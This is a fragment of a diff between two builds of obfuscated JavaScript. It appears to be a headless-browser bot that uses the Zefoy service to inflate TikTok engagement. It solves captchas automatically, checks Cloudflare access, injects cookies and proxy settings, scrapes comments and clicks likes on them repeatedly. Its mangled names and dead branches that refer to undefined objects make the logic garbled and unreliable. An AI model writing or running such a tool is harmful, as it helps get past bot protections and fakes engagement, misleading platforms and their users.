+            if (v257.CtkAc(v257.haWaN, v257.haWaN)) {
               process.stdout.clearLine(0);
               process.stdout.cursorTo(0);
-              process.stdout.write(v58 + " Accumulation limit reached!");
+              process.stdout.write(v56 + " Accumulation limit reached!");
+            } else {
+              v257.stdout.clearLine(0);
+              v258.stdout.cursorTo(0);
+              v259.stdout.write(v260 + " Captcha resolved! (" + v261 + ")");
+            }
+          }
+          process.exit(0);
+        } else {
+          v257.fcgMI(p606, "Solve captcha automatically...");
+        }
+      }
+      if (vA0iw[v257.flKdr] && v257.PokDn(vA0iw[v257.flKdr], 0) && v257.MScpU(v72, vA0iw[v257.flKdr]) && v257.vcZEM(v257.ehFpY(f55), 60)) {
+        if (v257.JoRFw(v257.ohZSI, v257.dBjWm)) {
+          p606.log("Cloudflare Valid / Zefoy Valid");
+        } else {
+          v257.DVIrt(f54, "[" + p607 + "] " + v258 + " (+" + v72 + ") [" + p608 + "] Stopped for not accumulating the defined minimum! (in " + v257.zlTBh(f55) + " mins)");
+          if (!v28) {
+            if (v257.mcwez(v257.HDpxb, v257.HDpxb)) {
+              process.stdout.clearLine(0);
+              process.stdout.cursorTo(0);
+              process.stdout.write(v56 + " Stopped for not accumulating the defined minimum!");
+            } else {
+              return v265.LxUAb(v265.bArlC(v265.oZOvo(v265.IUYtk(p609.hrtime()[0], 1000000000), v257.hrtime()[1]), v265.bIkDT(v265.sFmZf(v258[0], 1000000000), v259[1])), 60000000000).toFixed(2);
             }
           }
           process.exit(0);
         }
       }
-      if (vA0zS[v244.HthVR] && v244.clusN(vA0zS[v244.HthVR], 0) && v244.BeqBC(v74, vA0zS[v244.HthVR]) && v244.tYyFF(v244.FJUML(f54), 60)) {
-        if (v244.vJbgR(v244.bAIjC, v244.bAIjC)) {
-          v244.QhewQ(f53, "[" + p598 + "] " + v245 + " (+" + v74 + ") [" + p599 + "] Stopped for not accumulating the defined minimum! (in " + v244.fDuUo(f54) + " mins)");
-          if (!v26) {
-            if (v244.afIBC(v244.WhypN, v244.kRvjh)) {
-              process.stdout.clearLine(0);
-              process.stdout.cursorTo(0);
-              process.stdout.write(v58 + " Stopped for not accumulating the defined minimum!");
-            } else {
-              p600.stdout.clearLine(0);
-              v244.stdout.cursorTo(0);
-              v245.stdout.write(v246 + " Launch Zefoy in headless browser...");
-            }
-          }
-          process.exit(0);
+      if (vA0iw[v257.YoBRM] && v257.pgQfn(vA0iw[v257.YoBRM], 0) && v257.mwHdx(v257.WqspO(f55), v257.wbAhU(vA0iw[v257.YoBRM], 60))) {
+        if (v257.YTxtY(v257.IyYdp, v257.yYhDs)) {
+          p606 = "";
         } else {
-          v252.WVDqI(p597, "Chrome/Chromium executable is invalid!");
-        }
-      }
-      if (vA0zS[v244.UYJcD] && v244.eRMSH(vA0zS[v244.UYJcD], 0) && v244.clusN(v244.FJUML(f54), v244.pIWsJ(vA0zS[v244.UYJcD], 60))) {
-        if (v244.Grihp(v244.aByNp, v244.ukkks)) {
-          p600.stdout.clearLine(0);
-          v244.stdout.cursorTo(0);
-          v245.stdout.write(v246 + "  Do not use proxy!");
-        } else {
-          v244.BSSyt(f53, "[" + p598 + "] " + v245 + " (+" + v74 + ") [" + p599 + "] Stopped for reaching the maximum time limit! (in " + v244.PQxsc(f54) + " mins)");
-          if (!v26) {
-            if (v244.OeDTX(v244.BuCEE, v244.EezEx)) {
-              p597 = true;
+          v257.GVeWj(f54, "[" + p607 + "] " + v258 + " (+" + v72 + ") [" + p608 + "] Stopped for reaching the maximum time limit! (in " + v257.WqspO(f55) + " mins)");
+          if (!v28) {
+            if (v257.lvxCG(v257.gcKQo, v257.gcKQo)) {
+              v265.XGTOb(p607, "Cookies injected! (" + p608 + ")");
             } else {
               process.stdout.clearLine(0);
               process.stdout.cursorTo(0);
-              process.stdout.write(v58 + " Stopped for reaching the maximum time limit!");
+              process.stdout.write(v56 + " Stopped for reaching the maximum time limit!");
             }
           }
           process.exit(0);
         }
       }
-      v248 = !v248;
+      v261 = !v261;
+    } else {
+      p608 = v257.Qtknv(p609, v257);
     }
   }, 1000);
 }
-async function f26(p835, p836, p837 = null) {
-  const v287 = {
-    ncDnV: function (p838, p839) {
-      return p838(p839);
+async function f27(p851, p852, p853 = null) {
+  const v288 = {
+    WJwXL: function (p854, p855) {
+      return p854 - p855;
     },
-    eVaFD: function (p840, p841) {
-      return p840 === p841;
+    ZepaV: function (p856, p857) {
+      return p856 && p857;
     },
-    marsF: "jNHoh",
-    AGlZr: "Zefoy",
-    oKWtF: "Zefoy Tasks",
-    OgEIa: "Freer Tasks",
-    pnImn: function (p842, p843) {
-      return p842 - p843;
+    ZMatc: function (p858, p859) {
+      return p858 + p859;
     },
-    FXmBo: function (p844, p845) {
-      return p844 && p845;
+    pjyhB: "Executable not found in the following path:\n",
+    fXZLo: "Use the -b flag to set the path to the browser.",
+    BvZLu: function (p860, p861) {
+      return p860(p861);
     },
-    AxZoi: function (p846, p847) {
-      return p846 + p847;
+    bkmjL: function (p862, p863) {
+      return p862 === p863;
     },
-    wpEJS: "Executable not found in the following path:\n",
-    vRXPv: "Use the -b flag to set the path to the browser.",
-    ZnREe: function (p848, p849) {
-      return p848(p849);
+    gjjYg: "ETwEG",
+    VqvKA: function (p864, p865) {
+      return p864(p865);
     },
-    gFWED: "return (function() ",
-    YWCzt: "{}.constructor(\"return this\")( )",
-    IbIuS: function (p850, p851) {
-      return p850 < p851;
+    OZdfW: function (p866, p867) {
+      return p866(p867);
     },
-    HkBXO: function (p852, p853) {
-      return p852 ^ p853;
+    YweCA: function (p868, p869) {
+      return p868(p869);
     },
-    jmiFe: function (p854, p855, p856) {
-      return p854(p855, p856);
+    ctzXt: function (p870, p871) {
+      return p870 < p871;
     },
-    yDCMk: function (p857, p858) {
-      return p857 < p858;
+    kWnoQ: function (p872, p873, p874) {
+      return p872(p873, p874);
     },
-    VnKMh: function (p859, p860) {
-      return p859 + p860;
+    wLBHB: function (p875, p876) {
+      return p875 === p876;
     },
-    VmjnA: function (p861, p862) {
-      return p861 !== p862;
-    },
-    xBVjj: "uqWcZ",
-    zMJEE: "mNbzY",
-    gdXJc: "NVeCA",
-    wGqOl: function (p863, p864) {
-      return p863 !== p864;
-    },
-    rdqoQ: "fGwdv",
-    bLLBV: function (p865, p866) {
-      return p865 && p866;
-    },
-    hPBof: function (p867, p868) {
-      return p867 === p868;
-    },
-    gvEBj: "NCFlK",
-    MgBxO: function (p869, p870) {
-      return p869(p870);
-    },
-    bYvmA: function (p871, p872) {
-      return p871 > p872;
-    },
-    YyEoA: "QWMFO",
-    uktjZ: "iklEa",
-    Ygusc: function (p873, p874) {
-      return p873 !== p874;
-    },
-    HGJkJ: "UWGUU",
-    VwRHG: "cQDYK",
-    rcoBJ: function (p875, p876) {
-      return p875 !== p876;
-    },
-    IQjmE: "LWqhI",
-    HAJye: function (p877, p878) {
+    nRJxP: function (p877, p878) {
       return p877(p878);
     },
-    CdgCZ: function (p879, p880) {
-      return p879 !== p880;
+    OBWpS: function (p879) {
+      return p879();
     },
-    VkdGI: function (p881, p882) {
-      return p881 === p882;
+    sBPlh: function (p880, p881) {
+      return p880 / p881;
     },
-    YUgBx: "gmNNH",
-    gNEIl: "qMKsf",
-    AXrpO: "uKlqe",
-    NTgaK: "MfIHc",
-    kmHxS: "tSOcG",
-    ImISs: "PlAOv"
+    tkFLk: "GcFNK",
+    Oiwxi: "bkQKL",
+    lUegG: function (p882, p883) {
+      return p882 !== p883;
+    },
+    cOEHH: "reFTk",
+    ntmYG: "TyObI",
+    TIAEY: function (p884, p885) {
+      return p884 !== p885;
+    },
+    KaJUp: "NxjPj",
+    mAZkE: "GjAlu",
+    ebIXj: function (p886, p887) {
+      return p886 == p887;
+    },
+    oVXcY: "nPIWg",
+    wrdPZ: "jAnud",
+    HRYzm: function (p888, p889) {
+      return p888 * p889;
+    },
+    qCkCR: function (p890, p891) {
+      return p890 === p891;
+    },
+    jKnpn: "uSvFS",
+    KchZL: "pFcCr",
+    hEbbk: function (p892, p893) {
+      return p892 === p893;
+    },
+    mTnmv: "qjzKN",
+    WTLYg: "EooQF",
+    LGarF: "ePeLf",
+    hIKdb: function (p894, p895) {
+      return p894 !== p895;
+    },
+    oGXbz: "JhqIV",
+    usSSE: function (p896, p897) {
+      return p896(p897);
+    },
+    ioBtt: function (p898, p899) {
+      return p898(p899);
+    },
+    MWQPG: "wvMDn",
+    cJoVw: "kwhkT",
+    nYYuT: "vEWbL",
+    KfRIk: "4|0|3|2|1",
+    HWcGd: function (p900, p901) {
+      return p900(p901);
+    },
+    JiCyf: "jGYCS",
+    uzUoc: "xyZfa",
+    ZTcyW: function (p902, p903) {
+      return p902(p903);
+    },
+    myKFC: function (p904, p905, p906) {
+      return p904(p905, p906);
+    }
   };
-  return v287.jmiFe(setInterval, async () => {
-    const v288 = {
-      UENMf: function (p883, p884) {
-        return v287.ZnREe(p883, p884);
+  return v288.myKFC(setInterval, async () => {
+    const v289 = {
+      GqYQA: function (p907, p908) {
+        return v288.YweCA(p907, p908);
       },
-      StHhY: function (p885, p886) {
-        return v287.AxZoi(p885, p886);
+      HAKkw: function (p909, p910) {
+        return v288.VqvKA(p909, p910);
       },
-      GgGGB: function (p887, p888) {
-        return v287.AxZoi(p887, p888);
+      wfKLQ: function (p911, p912) {
+        return v288.ctzXt(p911, p912);
       },
-      ZixIw: v287.gFWED,
-      ijwUp: v287.YWCzt,
-      PGZeZ: function (p889, p890) {
-        return v287.IbIuS(p889, p890);
+      Jyzwv: function (p913, p914, p915) {
+        return v288.kWnoQ(p913, p914, p915);
       },
-      ZShwv: function (p891, p892) {
-        return v287.HkBXO(p891, p892);
+      ZqftZ: function (p916, p917) {
+        return v288.wLBHB(p916, p917);
       },
-      qoNzM: function (p893, p894, p895) {
-        return v287.jmiFe(p893, p894, p895);
+      gwUcL: function (p918, p919) {
+        return v288.WJwXL(p918, p919);
       },
-      ONSFD: function (p896, p897) {
-        return v287.IbIuS(p896, p897);
+      dAqCg: function (p920, p921) {
+        return v288.nRJxP(p920, p921);
       },
-      mEReY: function (p898, p899) {
-        return v287.yDCMk(p898, p899);
+      sfUfw: function (p922) {
+        return v288.OBWpS(p922);
       },
-      UiygQ: function (p900, p901) {
-        return v287.AxZoi(p900, p901);
+      IGjiW: function (p923, p924) {
+        return v288.sBPlh(p923, p924);
       },
-      ACxKn: function (p902, p903) {
-        return v287.VnKMh(p902, p903);
+      CrjjZ: function (p925, p926) {
+        return v288.sBPlh(p925, p926);
       }
     };
-    if (v287.VmjnA(v287.xBVjj, v287.zMJEE)) {
+    if (v288.wLBHB(v288.tkFLk, v288.Oiwxi)) {
+      v289.GqYQA(w, "[" + A + "] " + p + " (+" + C + ") " + J);
+      v289.HAKkw(D, l);
+    } else {
       try {
-        if (v287.eVaFD(v287.gdXJc, v287.gdXJc)) {
-          let v289 = await p835.evaluate("(() => {\n          var div = document.querySelector('i.fa-heart');\n          if (div) {\n            return true;\n          }\n          return false;\n        })();");
-          let v290 = await p835.evaluate("(() => {\n          var bt = document.querySelector('button.wbutton');\n          if (bt) {\n            return true;\n          }\n          return false;\n        })();");
-          if (v290) {
-            if (v287.wGqOl(v287.rdqoQ, v287.rdqoQ)) {
-              return;
+        if (v288.lUegG(v288.cOEHH, v288.cOEHH)) {
+          const v290 = v288.WJwXL(v288, v289);
+          a += v290;
+        } else {
+          let v291 = await p851.evaluate("(() => {\n          var div = document.querySelector('i.fa-heart');\n          if (div) {\n            return true;\n          }\n          return false;\n        })();");
+          let v292 = await p851.evaluate("(() => {\n          var bt = document.querySelector('button.wbutton');\n          if (bt) {\n            return true;\n          }\n          return false;\n        })();");
+          if (v292) {
+            if (v288.wLBHB(v288.ntmYG, v288.ntmYG)) {
+              await p851.evaluate("(() => {\n            document.querySelector(\"button.wbutton\").click();\n          })();");
             } else {
-              await p835.evaluate("(() => {\n            document.querySelector(\"button.wbutton\").click();\n          })();");
+              if (v288.ZepaV(!v300, !J)) {
+                y.stdout.clearLine(0);
+                R.stdout.cursorTo(0);
+                e.stdout.write(v288.ZMatc(h, " Chrome/Chromium executable is invalid!"));
+                B.info("\n\n", v288.pjyhB, "\"" + v + "\"\n", v288.fXZLo);
+              } else {
+                v288.BvZLu(G, "Chrome/Chromium executable is invalid!");
+              }
+              Q.exit(0);
             }
           }
-          if (v287.bLLBV(v289, !v87)) {
-            if (v287.hPBof(v287.gvEBj, v287.gvEBj)) {
-              const v291 = await p835.evaluate("(() => {\n            const commentNodes = document.querySelectorAll('li.list-group-item');\n            const commentsArray = [];\n            const maxTotalLength = 58;\n            commentNodes.forEach(node => {\n              const author = node.querySelector('div.font-weight-bold.d-inline-flex').innerText;\n              const text = node.querySelector('span.text-dark.font-weight-bold').innerText;\n              const hearts = parseInt(node.querySelector('span.text-green.font-weight-bold').innerText.replace(/,/g, ''));\n              const authorPart = author;\n              const heartsPart = '(' + hearts + ')';\n              const availableLengthForText = maxTotalLength - (authorPart.length + heartsPart.length + 6);\n              let textPart = text;\n              const textLength = Array.from(text).length;\n              if (textLength > availableLengthForText) {\n                textPart = text.substring(0, availableLengthForText - 4) + '...\"';\n              } else {\n                textPart = (text + '\"').padEnd(availableLengthForText);\n              }\n              const finalConcat = authorPart + ' \"' + textPart + ' ' + heartsPart;\n              commentsArray.push({\n                username: author,\n                comment: text,\n                timestamp: 0,\n                likes: hearts,\n                concat: finalConcat\n              });\n            });\n            return commentsArray;\n          })();");
-              v86 = [...new Set([...v86, ...v291].map(JSON.stringify))].map(JSON.parse);
-              await v287.MgBxO(f52, 300);
-              await p835.evaluate("(() => {\n            const nextBtn = document.querySelector('form input[name=\"nums\"][value=\"" + v287.VnKMh(v89, 1) + "\"]');\n            if (nextBtn) {\n              nextBtn.closest('form').querySelector('button').click();\n            }\n          })();");
-              v89++;
-              if (v287.bYvmA(v89, 7)) {
-                if (v287.VmjnA(v287.YyEoA, v287.YyEoA)) {
-                  v288.setPixelColor(v289, v290, v292);
+          if (v288.ZepaV(v291, !v85)) {
+            if (v288.TIAEY(v288.KaJUp, v288.mAZkE)) {
+              if (v288.ebIXj(v88.length, 0)) {
+                if (v288.TIAEY(v288.oVXcY, v288.wrdPZ)) {
+                  const v293 = await p851.evaluate("(() => {\n                const selectElement = document.querySelector('select[name=\"select_lmt\"]');\n                if (selectElement) {\n                  return Array.from(selectElement.options).map(option => option.value);\n                }\n                return [];\n            })();");
+                  v88.push(...v293);
                 } else {
-                  v87 = true;
+                  v289.GqYQA(p853, "Launch " + v288.provider + " in headless browser...");
                 }
               }
+              const v294 = await p851.evaluate("(() => {\n            const commentNodes = document.querySelectorAll('li.list-group-item');\n            const commentsArray = [];\n            const maxTotalLength = 58;\n            commentNodes.forEach(node => {\n              const author = node.querySelector('div.font-weight-bold.d-inline-flex').innerText;\n              const text = node.querySelector('span.text-dark.font-weight-bold').innerText;\n              const hearts = parseInt(node.querySelector('span.text-green.font-weight-bold').innerText.replace(/,/g, ''));\n              const authorPart = author;\n              const heartsPart = '(' + hearts + ')';\n              const availableLengthForText = maxTotalLength - (authorPart.length + heartsPart.length + 6);\n              let textPart = text;\n              const textLength = Array.from(text).length;\n              if (textLength > availableLengthForText) {\n                textPart = text.substring(0, availableLengthForText - 4) + '...\"';\n              } else {\n                textPart = (text + '\"').padEnd(availableLengthForText);\n              }\n              const finalConcat = authorPart + ' \"' + textPart + ' ' + heartsPart;\n              commentsArray.push({\n                username: author,\n                comment: text,\n                timestamp: 0,\n                likes: hearts,\n                concat: finalConcat\n              });\n            });\n            return commentsArray;\n          })();");
+              v84 = [...new Set([...v84, ...v294].map(JSON.stringify))].map(JSON.parse);
+              await v288.BvZLu(f53, 1000);
+              await p851.evaluate("(() => {\n            const nextBtn = document.querySelector('form input[name=\"p\"][value=\"" + v288.HRYzm(v87, 50) + "\"]');\n            if (nextBtn) {\n              nextBtn.closest('form').querySelector('button').click();\n            }\n          })();");
+              v87++;
+              const v295 = await p851.evaluate("(() => {\n            const divPagination = document.querySelector('div.d-flex');\n            if (divPagination) {\n              const divPaginationHidden = document.querySelector('div.d-flex.nonec');\n              if (divPaginationHidden) {\n                return false;\n              }\n              return true;\n            }\n            return false;\n          })();");
+              if (!v295) {
+                if (v288.qCkCR(v288.jKnpn, v288.KchZL)) {
+                  let v296 = "";
+                  for (let v297 = 0; v289.wfKLQ(v297, v292.length); v297 += 2) {
+                    v296 += v294.fromCharCode(v289.Jyzwv(v295, M.substr(v297, 2), 16));
+                  }
+                  return v296;
+                } else {
+                  v85 = true;
+                }
+              }
+            } else if (v289.ZqftZ(z, 0)) {
+              D = l;
             } else {
-              return p836.task;
+              M = v289.gwUcL(q, o);
             }
           }
-          let v292 = await p835.evaluate("(() => {\n          return document.querySelector(\"" + p836 + " > div > div\").innerText;\n        })();");
-          if (/READY/.test(v292)) {
-            if (v287.eVaFD(v287.uktjZ, v287.uktjZ)) {
-              await p835.evaluate("(() => {\n            document\n              .querySelector(\"" + p836 + " > div > form > div > div > button\")\n              .click();\n          })();");
+          let v298 = await p851.evaluate("(() => {\n          return document.querySelector(\"" + p852 + " > div > div\").innerText;\n        })();");
+          if (/READY/.test(v298)) {
+            if (v288.hEbbk(v288.mTnmv, v288.WTLYg)) {
+              const v299 = {
+                name: p852.url
+              };
+              return v299;
             } else {
-              v288.UENMf(p837, v287);
-              return null;
+              await p851.evaluate("(() => {\n            document\n              .querySelector(\"" + p852 + " > div > form > div > div > button\")\n              .click();\n          })();");
             }
           }
-          const v293 = await p835.evaluate("(() => {\n          const div = document.querySelector('div.container.t-chearts-menu > div.card.card-ortlax > div');\n          return div && div.textContent.trim() === 'No comments found';\n        })();");
-          if (v293) {
-            if (v287.Ygusc(v287.HGJkJ, v287.VwRHG)) {
-              v87 = true;
-              await p835.evaluate("(() => {\n            document\n              .querySelector('div.container.t-chearts-menu > div.card.card-ortlax > form > div > div > button')\n              .click();\n          })();");
+          const v300 = await p851.evaluate("(() => {\n          const div = document.querySelector('div.container.t-chearts-menu > div.card.card-ortlax > div');\n          return div && div.textContent.trim() === 'No comments found';\n        })();");
+          if (v300) {
+            if (v288.qCkCR(v288.LGarF, v288.LGarF)) {
+              v85 = true;
+              await p851.evaluate("(() => {\n            document\n              .querySelector('div.container.t-chearts-menu > div.card.card-ortlax > form > div > div > button')\n              .click();\n          })();");
             } else {
-              let v294;
               try {
-                v294 = wwoajA.UENMf(v288, wwoajA.StHhY(wwoajA.GgGGB(wwoajA.ZixIw, wwoajA.ijwUp), ");"))();
-              } catch (F) {
-                v294 = v290;
+                const v301 = v289.HAKkw(z, v291);
+                if (!v301.ok) {
+                  return null;
+                }
+                const v302 = v301.text();
+                return v302;
+              } catch (e) {
+                v289.dAqCg(v298, e);
+                return null;
               }
-              return v294;
             }
           }
-          if (v289 && v287.rcoBJ(p837, null) && v88 && v87) {
-            if (v287.hPBof(v287.IQjmE, v287.IQjmE)) {
-              function f27(p904) {
-                const v295 = {
-                  Tkjnx: function (p905, p906) {
-                    return v287.ncDnV(p905, p906);
-                  }
-                };
-                if (v287.eVaFD(v287.marsF, v287.marsF)) {
-                  return v287.ncDnV(btoa, v287.ncDnV(unescape, v287.ncDnV(encodeURIComponent, p904)));
+          if (v291 && v288.lUegG(p853, null) && v86 && v85 && v89) {
+            if (v288.hIKdb(v288.oGXbz, v288.oGXbz)) {
+              D.stdout.moveCursor(0, -3);
+              l.stdout.clearScreenDown();
+              M.stdout.write("\n" + q + "[33m " + o + " [34m[" + L + "][0m " + T + "  [90m(" + v289.sfUfw(Q) + " /hr " + v289.IGjiW(v289.sfUfw(y), 60).toFixed(2) + " hrs)[0m\n\n");
+              R.stdout.write(e + " Running: " + h.substring(0, 43));
+            } else {
+              function f28(p927) {
+                if (v288.bkmjL(v288.gjjYg, v288.gjjYg)) {
+                  return v288.VqvKA(btoa, v288.OZdfW(unescape, v288.OZdfW(encodeURIComponent, p927)));
                 } else {
-                  v295.Tkjnx(p837, "Wrong captcha! (" + v287 + ")");
+                  return false;
                 }
               }
-              const v296 = await p835.evaluate("(() => {\n            function base64Encode(str) {\n              return btoa(unescape(encodeURIComponent(str)));\n            }\n      \n            const comments = document.querySelectorAll('ul.list-group > li.list-group-item');\n            for (let i = 0; i < comments.length; i++) {\n              const comment = comments[i];\n              const username = base64Encode(comment.querySelector('div.font-weight-bold.d-inline-flex').innerText.trim());\n              const text = base64Encode(comment.querySelector('span.text-dark.font-weight-bold').innerText.trim());\n      \n              if (username === '" + v287.MgBxO(f27, v88.username.trim()) + "' && text === '" + v287.HAJye(f27, v88.comment.trim()) + "') {\n                return i;\n              }\n            }\n            return null;\n          })();");
-              await v287.ncDnV(f52, 500);
-              if (v287.CdgCZ(v296, null)) {
-                if (v287.VkdGI(v287.YUgBx, v287.gNEIl)) {
-                  if (v287.eVaFD(p836.provider, v287.AGlZr)) {
-                    return v287.oKWtF;
-                  } else {
-                    return v287.OgEIa;
-                  }
+              const v303 = await p851.evaluate("(() => {\n            function base64Encode(str) {\n              return btoa(unescape(encodeURIComponent(str)));\n            }\n      \n            const comments = document.querySelectorAll('ul.list-group > li.list-group-item');\n            for (let i = 0; i < comments.length; i++) {\n              const comment = comments[i];\n              const username = base64Encode(comment.querySelector('div.font-weight-bold.d-inline-flex').innerText.trim());\n              const text = base64Encode(comment.querySelector('span.text-dark.font-weight-bold').innerText.trim());\n      \n              if (username === '" + v288.usSSE(f28, v86.username.trim()) + "' && text === '" + v288.ioBtt(f28, v86.comment.trim()) + "') {\n                return i;\n              }\n            }\n            return null;\n          })();");
+              await v288.nRJxP(f53, 500);
+              if (v288.lUegG(v303, null)) {
+                if (v288.TIAEY(v288.MWQPG, v288.MWQPG)) {
+                  l.stdout.moveCursor(0, -3);
+                  M.stdout.clearScreenDown();
+                  q.stdout.write("\n" + o + "[33m " + L + " [34m[" + T + "][0m " + Q + "  [90m(" + v289.sfUfw(y) + " /hr " + v289.CrjjZ(v289.sfUfw(f28), 60).toFixed(2) + " hrs)[0m\n\n");
+                  v303.stdout.write(h + " Waiting: " + B + " mins (ERROR: " + v.substring(0, 22) + ")...");
                 } else {
-                  const v297 = await p835.evaluate("(() => {\n              var likeCountElement = document.querySelectorAll('li.list-group-item div span.text-green.font-weight-bold')[" + v296 + "];\n              if (likeCountElement) {\n                const hearts = parseInt(likeCountElement.innerText.replace(/,/g, ''));\n                return hearts;\n              }\n              return null;\n            })();");
-                  if (v297) {
-                    if (v287.wGqOl(v287.AXrpO, v287.NTgaK)) {
-                      v88.likes = v297;
-                      await v287.HAJye(f52, 500);
-                      await p835.evaluate("(() => {\n                var likeBtn = document.querySelectorAll('li.list-group-item button.btn.btn-primary.rounded-0')[" + v296 + "];\n                if (likeBtn) {\n                  likeBtn.click();\n                }\n              })();");
-                    } else if (v287.eVaFD(v290, 0)) {
-                      B = r;
+                  const v304 = await p851.evaluate("(() => {\n              var likeCountElement = document.querySelectorAll('li.list-group-item div span.text-green.font-weight-bold')[" + v303 + "];\n              if (likeCountElement) {\n                const hearts = parseInt(likeCountElement.innerText.replace(/,/g, ''));\n                return hearts;\n              }\n              return null;\n            })();");
+                  if (v304) {
+                    if (v288.wLBHB(v288.cJoVw, v288.nYYuT)) {
+                      p853.stdout.moveCursor(0, -9);
+                      v288.stdout.clearScreenDown();
                     } else {
-                      J = v287.pnImn(f27, v296);
+                      const v305 = v288.KfRIk.split("|");
+                      let v306 = 0;
+                      while (true) {
+                        switch (v305[v306++]) {
+                          case "0":
+                            await v288.nRJxP(f53, 500);
+                            continue;
+                          case "1":
+                            await p851.evaluate("(() => {\n                var likeBtn = document.querySelectorAll('li.list-group-item button.btn.btn-primary.rounded-0')[" + v303 + "];\n                if (likeBtn) {\n                  likeBtn.click();\n                }\n              })();");
+                            continue;
+                          case "2":
+                            await v288.HWcGd(f53, 500);
+                            continue;
+                          case "3":
+                            await p851.evaluate("(() => {\n                const selectElements = document.querySelectorAll('select.form-select');\n                selectElements.forEach((selectElement) => {\n                  selectElement.value = '" + v89 + "';\n                });\n              })();");
+                            continue;
+                          case "4":
+                            v86.likes = v304;
+                            continue;
+                        }
+                        break;
+                      }
                     }
                   }
                 }
               } else {}
-            } else {
-              if (v287.FXmBo(!I, !U)) {
-                T.stdout.clearLine(0);
-                s.stdout.cursorTo(0);
-                H.stdout.write(v287.AxZoi(u, " Chrome/Chromium executable is invalid!"));
-                W.info("\n\n", v287.wpEJS, "\"" + R + "\"\n", v287.vRXPv);
-              } else {
-                v287.ZnREe(o, "Chrome/Chromium executable is invalid!");
-              }
-              g.exit(0);
             }
           }
-        } else {
-          let v298 = "";
-          for (let v299 = 0; v288.PGZeZ(v299, B.length); v299 += 2) {
-            let v300 = v288.ZShwv(v288.qoNzM(F, p.substr(v299, 2), 16), 127);
-            v298 += h.fromCharCode(v300);
-          }
-          let v301 = v288.UENMf(I, v298);
-          return U.parse(v301);
         }
-      } catch (H) {
-        if (v287.rcoBJ(v287.kmHxS, v287.ImISs)) {
-          v287.HAJye(f53, H);
+      } catch (r) {
+        if (v288.wLBHB(v288.JiCyf, v288.uzUoc)) {
+          v289.stdout.clearLine(0);
+          a.stdout.cursorTo(0);
+          z.stdout.write(w + "  Check proxies...");
         } else {
-          let v302 = p836.split("");
-          for (let v303 = 0; v288.ONSFD(v303, v302.length); v303 += 2) {
-            if (v288.mEReY(v288.UiygQ(v303, 1), v302.length)) {
-              let v304 = v302[v303];
-              v302[v303] = v302[v288.ACxKn(v303, 1)];
-              v302[v288.ACxKn(v303, 1)] = v304;
-            }
-          }
-          return v302.join("");
+          v288.ZTcyW(f54, r);
         }
       }
-    } else {
-      v288.UENMf(p837, "Check browser (" + v287 + ")...");
     }
   }, 5000);
 }
-async function f28(p907) {
-  const v305 = {
-    fvTev: function (p908, p909) {
-      return p908 !== p909;
+async function f29(p928) {
+  const v307 = {
+    VBGUP: function (p929, p930) {
+      return p929(p930);
     },
-    oKfNa: "SjTxQ",
-    pmPFm: "bt.com",
-    weWxc: "bt_proxy",
-    wAHbB: "user_agent",
-    Zdfqo: function (p910, p911) {
-      return p910(p911);
+    BobeJ: function (p931, p932) {
+      return p931 !== p932;
+    },
+    rYDoB: "kanwa",
+    pFkUF: "ALuvC",
+    vtBkD: "bt.com",
+    hiRer: "bt_proxy",
+    rqEsw: "user_agent",
+    ZDUkq: function (p933, p934) {
+      return p933(p934);
     }
   };
   try {
-    if (v305.fvTev(v305.oKfNa, v305.oKfNa)) {
-      const v306 = v.apply(v306, arguments);
-      N = null;
-      return v306;
-    } else {
-      const v307 = {
-        domain: v305.pmPFm,
-        name: v305.weWxc,
-        value: v82
+    if (v307.BobeJ(v307.rYDoB, v307.pFkUF)) {
+      const v308 = {
+        domain: v307.vtBkD,
+        name: v307.hiRer,
+        value: v80
       };
-      p907.push(v307);
-      p907.push({
-        domain: v305.pmPFm,
-        name: v305.wAHbB,
-        value: v305.Zdfqo(encodeURIComponent, v77)
+      p928.push(v308);
+      p928.push({
+        domain: v307.vtBkD,
+        name: v307.rqEsw,
+        value: v307.ZDUkq(encodeURIComponent, v75)
       });
-      await a0zd.promises.writeFile(v93, JSON.stringify(p907));
+      await a0ic.promises.writeFile(v93, JSON.stringify(p928));
+    } else {
+      const v309 = {
+        TDNWF: function (p935, p936) {
+          return v307.VBGUP(p935, p936);
+        }
+      };
+      const v310 = /@(\w+)\n(.+)\n(\d+\s\w+\sago)\n([\d|\,]+)/g;
+      const v311 = [...v307.matchAll(v310)];
+      return v311.map(p937 => {
+        return {
+          username: p937[1],
+          comment: p937[2],
+          timestamp: p937[3],
+          likes: v309.TDNWF(v310, p937[4].replace(/[,\.]/g, "")),
+          concat: "@" + p937[1] + " \"" + p937[2].substring(0, 10) + "...\" " + p937[3] + " (" + p937[4] + ")"
+        };
+      });
     }
-  } catch (N) {}
+  } catch (a) {}
 }
-async function f29(p912) {
-  const v308 = {
-    zjEAR: function (p913, p914) {
-      return p913 + p914;
+async function f30(p938) {
+  const v312 = {
+    ccMWq: function (p939, p940) {
+      return p939(p940);
     },
-    FCThm: "Executable not found in the following path:\n",
-    fSeIZ: "Use the -b flag to set the path to the browser.",
-    JlPgU: function (p915, p916) {
-      return p915 - p916;
+    JNtny: function (p941, p942) {
+      return p941 + p942;
     },
-    xtGDR: function (p917, p918) {
-      return p917 !== p918;
+    tVnrB: " Solve captcha automatically...",
+    oLJOP: function (p943, p944) {
+      return p943 === p944;
     },
-    RfNZL: "bARHU",
-    UEsNG: "ivwYd",
-    zlEPD: function (p919, p920) {
-      return p919 || p920;
+    ChWef: "kQIOx",
+    rKTGD: function (p945, p946) {
+      return p945 || p946;
     },
-    WzMMu: function (p921, p922) {
-      return p921 === p922;
+    OrNUL: "fZVZw",
+    dBSab: "ggyba",
+    HwJWA: function (p947) {
+      return p947();
     },
-    xGNIe: "nUWiQ",
-    TvnfH: "OBXtL",
-    OdcDO: function (p923) {
-      return p923();
+    hEVii: function (p948, p949) {
+      return p948 !== p949;
     },
-    KSYug: function (p924, p925) {
-      return p924 === p925;
+    kLUPm: "vCjCC",
+    Svfag: function (p950, p951) {
+      return p950 === p951;
     },
-    xHEVe: "onRtG",
-    NzQQd: "qlZQs",
-    zYnJk: "LfNUk"
+    ExjNi: "TMsZm"
   };
   try {
-    if (v308.WzMMu(v308.xGNIe, v308.TvnfH)) {
-      d.stdout.clearLine(0);
-      N.stdout.cursorTo(0);
-      C.stdout.write(S + " The captcha is blocked and cannot be accessed!");
+    if (v312.oLJOP(v312.OrNUL, v312.dBSab)) {
+      v312 = "";
     } else {
-      const v309 = await v308.OdcDO(f31);
-      p912 = JSON.parse(p912);
-      if (v308.WzMMu(v309.length, 0)) {
-        if (v308.KSYug(v308.xHEVe, v308.NzQQd)) {
